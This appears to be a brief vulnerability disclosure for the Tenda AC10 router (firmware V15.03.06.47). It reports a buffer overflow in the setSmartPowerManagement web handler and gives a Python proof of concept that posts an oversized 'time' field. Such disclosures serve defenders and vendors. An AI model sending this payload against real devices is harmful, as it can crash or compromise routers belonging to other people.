# buffer overflow

## Tenda_AC10

version: V15.03.06.47

## Description:

There is a buffer overflow in httpd/setSmartPowerManagement

## Source:

you may download it from : https://www.tendacn.com/download/detail-3796.html

## Analyse:


![](2.png)

get value from time ,then call sscanf, cause buff overflow




## POC
```
url = "http://192.168.1.13/goform/setSmartPowerManagement"
payload = 'A'*300 + ':'+'\n'

r = requests.post(url, data={'time': payload})
``` 
